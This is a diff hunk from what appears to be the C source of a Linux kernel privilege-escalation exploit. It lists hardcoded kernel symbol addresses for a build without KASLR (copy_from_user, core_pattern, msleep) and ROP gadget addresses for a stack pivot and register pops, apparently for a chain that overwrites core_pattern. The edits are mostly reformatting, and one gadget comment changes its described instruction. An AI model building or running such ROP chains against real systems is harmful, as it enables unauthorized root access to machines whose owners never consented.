@@ -51,14 +51,14 @@
 /* ============================== Kernel stuff ============================== */
 
 /* Addresses from System.map (no KASLR) */
-#define COPY_FROM_USER_PTR 		0xffffffff8154b740UL  /* copy_from_user */
-#define CORE_PATTERN_PTR 		0xffffffff82b78980UL  /* &core_pattern  */
-#define MSLEEP_PTR            		0xffffffff81142800UL  /*    msleep      */
+#define COPY_FROM_USER_PTR		0xffffffff8154b740UL
+#define CORE_PATTERN_PTR		0xffffffff82b78980UL
+#define MSLEEP_PTR			0xffffffff81142800UL
 
 /* ROP gadgets */
-#define STACKPIVOT_GADGET_PTR 		0xffffffff811d9489UL  /* add rsp, 0x1a8 ; jmp 0xffffffff81f4dd60 */
-#define POP_RDX_POP_RDI 		0xffffffff8158f54fUL  /*         pop rdx ; pop rdi ; ret         */
-#define POP_RSI 			0xffffffff81d1da59UL  /*              pop rsi ; ret              */
+#define STACKPIVOT_GADGET_PTR		0xffffffff811d9489UL /* add rsp, 0x1a8 ; ret */
+#define POP_RDX_POP_RDI			0xffffffff8158f54fUL /* pop rdx ; pop rdi ; ret */
+#define POP_RSI				0xffffffff81d1da59UL /* pop rsi ; ret */
 
 /* core_pattern stuff */
 #define SYSCHK(x)                                 \
